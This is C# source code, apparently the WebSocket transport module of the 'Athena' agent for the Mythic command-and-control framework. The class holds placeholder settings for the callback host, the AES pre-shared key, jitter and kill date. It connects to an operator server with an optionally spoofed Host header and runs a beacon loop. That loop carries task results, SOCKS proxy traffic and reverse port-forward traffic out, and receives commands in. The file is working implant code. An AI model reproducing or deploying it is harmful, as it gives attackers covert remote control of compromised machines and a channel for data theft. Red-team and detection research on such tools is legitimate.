using Athena.Models.Config;
using Athena.Utilities;
using System.Text.Json;
using System.Net.WebSockets;
using System.Text;
using Athena.Models.Mythic.Checkin;
using System.Diagnostics;
using Athena.Models.Commands;
using Athena.Models.Mythic.Tasks;
using Athena.Commands;
using Athena.Profiles.Websocket;
using Athena.Models.Comms.SMB;
using Athena.Models.Proxy;
using Websocket.Client;

namespace Athena
{
    public class Websocket : IProfile
    {
        public string uuid { get; set; }
        public string psk { get; set; }
        public string url { get; set; }
        public string endpoint { get; set; }
        public string userAgent { get; set; }
        public string hostHeader { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        public bool encrypted { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        private int currentAttempt = 0;
        private int maxAttempts = 5;
        public int connectAttempts { get; set; }
        public DateTime killDate { get; set; }
        public ClientWebSocket ws { get; set; }
        public PSKCrypto crypt { get; set; }
        private CancellationTokenSource cts = new CancellationTokenSource();
        public event EventHandler<MessageReceivedArgs> SetMessageReceived;
        private WebsocketClient _client { get; set; }

        public Websocket()
        {
            int callbackPort = Int32.Parse("callback_port");
            string callbackHost = "callback_host";
            this.endpoint = "ENDPOINT_REPLACE";
            this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
            this.userAgent = "USER_AGENT";
            this.hostHeader = "%HOSTHEADER%";
            this.psk = "AESPSK";
            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
            this.sleep = sleep;
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.uuid = "%UUID%";
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(this.uuid, this.psk);
                this.encrypted = true;
            }

            var factory = new Func<ClientWebSocket>(() =>
            {
                var client = new ClientWebSocket
                {
                    Options =
                    {
                        KeepAliveInterval = TimeSpan.FromSeconds(0),
                        // Proxy = ...
                        // ClientCertificates = ...
                    }
                };

                this._client.ReconnectTimeout = null;

                if (!String.IsNullOrEmpty(this.hostHeader))
                {
                    client.Options.SetRequestHeader("Host", this.hostHeader);
                }

                client.Options.SetRequestHeader("Accept-Type", "Push");
                //%CUSTOMHEADERS%

                return client;
            });


            this._client = new WebsocketClient(new Uri(this.url), factory);
            this._client.MessageReceived.Subscribe(msg =>
            {
                MessageReceivedArgs mra;
                WebSocketMessage wm = JsonSerializer.Deserialize<WebSocketMessage>(msg.Text, WebsocketJsonContext.Default.WebSocketMessage);

                if (this.encrypted)
                {
                    mra = new MessageReceivedArgs(this.crypt.Decrypt(wm.data));
                }
                else
                {
                    mra = new MessageReceivedArgs(Misc.Base64Decode(wm.data).Substring(36));
                }

                Debug.WriteLine($"[{DateTime.Now}] Message Received from Mythic: {mra.message} triggering event.");
                SetMessageReceived(this, mra);
            });


            this._client.ReconnectionHappened.Subscribe(info =>
            {
                Debug.WriteLine($"Reconnection happened, type: {info.Type}, url: {url}");
            });
            this._client.DisconnectionHappened.Subscribe(info =>
                Debug.WriteLine($"Disconnection happened, type: {info.Type}"));
            //this._client.ReconnectTimeout = TimeSpan.Zero;
            //this._client.ErrorReconnectTimeout = TimeSpan.Zero;
            this._client.Start().Wait();
        }
        public async Task StartBeacon()
        {
            this.cts = new CancellationTokenSource();
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
                Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
                Task<List<MythicDatagram>> socksTask = ProxyResponseHandler.GetSocksMessagesAsync();
                Task<List<MythicDatagram>> rpFwdTask = ProxyResponseHandler.GetRportFwdMessagesAsync();
                await Task.WhenAll(responseTask, delegateTask, socksTask, rpFwdTask);

                //If we don't have anything to return, continue the loop.
                if (delegateTask.Result.Count <= 0 &&
                    socksTask.Result.Count <= 0 &&
                    responseTask.Result.Count <= 0 &&
                    rpFwdTask.Result.Count <= 0)
                {
                    continue;
                }

                GetTasking gt = new GetTasking()
                {
                    action = "post_response",
                    tasking_size = -1,
                    delegates = delegateTask.Result,
                    socks = socksTask.Result,
                    responses = responseTask.Result,
                    rpfwd = rpFwdTask.Result,
                };
                try
                {
                    await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
                }
                catch (Exception e)
                {
                    Debug.WriteLine($"[{DateTime.Now}] Becaon attempt failed {e}");
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cts.Cancel();
                    await this._client.Stop(WebSocketCloseStatus.EndpointUnavailable, "Exiting");
                    this._client.Dispose();
                }
            }
        }
        public bool StopBeacon()
        {
            this.cts.Cancel();
            return true;
        }
        public async Task<bool> Checkin(Checkin checkin)
        {
            int maxAttempts = 3;
            int currentAttempt = 0;
            do
            {
                Debug.WriteLine("Sending.");
                if (await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin)))
                {
                    break;
                }

                currentAttempt++;
            } while (currentAttempt <= maxAttempts);

            return true;
        }
        public async Task<bool> Send(string json)
        {
            try
            {
                if (this._client.IsRunning)
                {
                    if (this.encrypted)
                    {
                        json = this.crypt.Encrypt(json);
                    }
                    else
                    {
                        json = await Misc.Base64Encode(this.uuid + json);
                    }

                    WebSocketMessage m = new WebSocketMessage()
                    {
                        client = true,
                        data = json,
                        tag = String.Empty
                    };

                    string message = JsonSerializer.Serialize(m, WebsocketJsonContext.Default.WebSocketMessage);
                    //byte[] msg = Encoding.UTF8.GetBytes(message);

                    this._client.Send(message);
                }
            }
            catch
            {
                return false;
            }

            return true;
        }
    }
}
